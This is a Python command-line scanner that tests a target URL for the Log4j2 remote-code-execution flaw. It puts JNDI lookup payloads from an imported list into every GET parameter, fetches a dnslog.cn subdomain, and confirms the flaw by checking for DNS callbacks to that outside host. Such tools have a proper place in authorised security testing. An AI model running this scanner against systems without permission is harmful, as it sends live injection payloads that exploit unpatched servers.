# Author: Tommonkey
# Date: 2022/10/30
# Blog: https://www.tommonkey.cn
# Info: This tool is used to detect weal of log4j2 rce
# ----------------------------------------------------------
import time
from termcolor import cprint
import requests
import argparse
from config import *
from POC import *
from urllib.parse import quote,unquote
import re


# argparse setting
def argsDeal():
    parse = argparse.ArgumentParser("\npython main.py -u 'https://tommonkey.cn/index.php?id=5&name=abc'")
    parse.add_argument("-u","--url",action="store",help="Setting target's URL and use method is GET")
    # parse.add_argument("-d","--date",action="store",help="Setting target,and use method is POST")
    # parse.add_argument("-f","--file",action="store",help="Batch read target's URL")
    # parse.add_argument("--bypass",action="store",help="Test bypass waf")
    opt = parse.parse_args()
    return opt

# get a subdomain
def getDomain():
    getDomainUrl = "http://www.dnslog.cn/getdomain.php"
    getDomain = requests.get(getDomainUrl, headers=headers)
    getCookie = getDomain.cookies
    # print(domainName.text, domainCookie)
    return getDomain,getCookie

# read subdomain record
def recordDomain(domainCookie):
    recordDomainUrl = "http://www.dnslog.cn/getrecords.php"
    recordDomain = requests.get(recordDomainUrl,headers=headers,cookies=domainCookie)
    # cprint(readDomain.text, "red")
    return recordDomain

# method:GET ,and use re module to replace the specified parameter
def re_deal(url):
    url = unquote(url)
    load_url = []
    record_poc = []
    count = 0
    subDomain,Cookie = getDomain()
    subDomain = str(subDomain.text)
    for p in log4j2_poc:
        p = str(p)
        count+= 1
        half_product = p+str(count)+'.'+subDomain+'}'
        half_product = quote(half_product)
        complete_poc = '='+half_product
        record_poc.append(str(count)+'.'+subDomain)
        re_rule = r'=[\u4E00-\u9FA5A-Za-z0-9:/.]*'
        result = re.sub(re_rule,complete_poc , url)
        # print(result)     # show the complete url
        load_url.append(result)
    return load_url,Cookie,record_poc

# to send packages of method is GET
def sendGet(load_list,subCookie,recordPOC):
    real_vul = []
    try:
        for url in load_list:
            requests.get(url,headers=headers)
            time.sleep(3)       # waiting 4 second to access record ,and The larger the value, the higher the accuracy
        content = recordDomain(subCookie)
        for jj in recordPOC:
            if jj in content.text:
                real_vul.append(jj)
                cprint("[+] There is a Log4j2 vulnerability in the target, please fix it in time",'red')
            else:
                cprint("[+] Target is security",'green')
        return real_vul
    except Exception as err:
        # print(err)
        cprint("目标路径不存在或目标无法访问",'yellow')


if __name__ == "__main__":
    cprint(banner, 'green')
    args = argsDeal()
    # print(args)
    if args.url is not None:        # methon:GET
        load_list,subCookie,recordPOC = re_deal(args.url)
        sendGet(load_list,subCookie,recordPOC)

    # if args.file:
    #     pass

    else:
        cprint("Please input correct args in keyborad ,and you can input:\npython main.py -h ,to get help","red")

